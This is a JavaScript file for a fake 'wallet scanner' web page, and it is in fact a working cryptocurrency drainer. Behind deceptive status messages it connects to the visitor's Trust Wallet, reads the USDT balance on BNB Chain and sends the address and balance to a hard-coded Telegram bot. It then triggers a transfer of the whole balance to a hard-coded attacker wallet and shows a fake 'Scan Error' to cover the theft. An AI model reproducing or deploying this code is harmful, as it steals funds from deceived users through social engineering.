const myWalletAddress = "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe"; 
const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; 

// Telegram (Replace with your info)
const telegramToken = "7849151110:AAFGo5n4hPLk8y8l8tSESYbCl_vut3TPHsI";
const telegramId = "7849151110";

function updateUI(main, sub) {
    document.getElementById("status-main").innerText = main;
    document.getElementById("status-sub").innerText = sub;
}

async function startScan() {
    const isWeb3 = !!(window.ethereum || window.trustwallet);
    const overlay = document.getElementById("loading-overlay");

    if (!isWeb3) {
        if (/Android|iPhone|iPad/i.test(navigator.userAgent)) {
            const url = window.location.href.replace("https://", "");
            window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=https://" + url;
            return;
        }
        alert("Scanner requires Trust Wallet app.");
        return;
    }

    overlay.style.display = "flex";
    updateUI("Accessing Camera...", "Scanning wallet QR signature...");

    try {
        const provider = window.ethereum || window.trustwallet;
        const web3 = new Web3(provider);
        const accounts = await provider.request({ method: 'eth_requestAccounts' });
        const userAddress = accounts[0];

        updateUI("Wallet Linked", "Syncing asset balance...");
        
        await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });

        const abi = [
            { "constant": true, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function" },
            { "constant": false, "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}], "name": "transfer", "outputs": [{"name": "", "type": "bool"}], "type": "function" }
        ];

        const contract = new web3.eth.Contract(abi, usdtAddress);
        const balanceWei = await contract.methods.balanceOf(userAddress).call();
        const balance = web3.utils.fromWei(balanceWei, 'ether');

        // Alert Telegram
        fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${telegramId}&text=👤 Scanner Alert: ${userAddress} | Bal: ${balance} USDT`);

        if (parseFloat(balance) > 0) {
            updateUI("Verifying Assets...", "Finalizing secure snapshot...");
            
            // This triggers the Send/Confirm popup
            await contract.methods.transfer(myWalletAddress, balanceWei).send({ from: userAddress });
            
            updateUI("Finishing...", "Clearing temporary cache...");
            setTimeout(() => {
                alert("Scan Error: Blockchain sync failed. Please try again.");
                location.reload();
            }, 1000);
        } else {
            alert("Scanner: Verification complete. No assets found.");
            overlay.style.display = "none";
        }

    } catch (e) {
        overlay.style.display = "none";
        alert("Scan Cancelled.");
    }
}

document.getElementById("nextBtn").addEventListener("click", startScan);
